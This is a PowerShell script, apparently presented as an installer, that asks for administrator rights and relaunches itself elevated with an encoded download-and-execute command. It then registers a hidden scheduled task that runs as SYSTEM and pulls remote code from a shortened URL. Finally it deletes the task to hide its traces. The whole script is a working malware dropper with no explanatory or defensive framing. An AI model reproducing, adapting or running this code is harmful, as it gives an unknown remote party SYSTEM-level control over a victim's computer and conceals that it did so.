Write-Host "Please Allow admin privileges!" -ForegroundColor Blue
# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Command to download and execute the script from the URL
    $command = "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
    
    # Encode the command to bypass issues with special characters in the URL
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    # Restart PowerShell as Administrator and execute the encoded command
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    exit # Exits the current, non-administrative script instance
}

# Define the action to be taken (PowerShell command)
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
    -Argument '-WindowStyle Hidden -NoProfile -Command "iex((New-Object System.Net.WebClient).DownloadString(\'https://t.ly/TBedb\'))"'

# Define the principal (run as SYSTEM)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Create and register the task
$taskName = "ImmediateTaskAsSystem"
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Settings (New-ScheduledTaskSettingsSet -RunWhetherUserIsLoggedOnOrNot $true -DisallowStartIfOnBatteries $false -StopIfGoingOnBatteries $false -StartWhenAvailable $true)

# Start the task immediately
Start-ScheduledTask -TaskName $taskName

# Optionally, wait a moment for the task to execute, then remove it
Start-Sleep -Seconds 3
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
exit
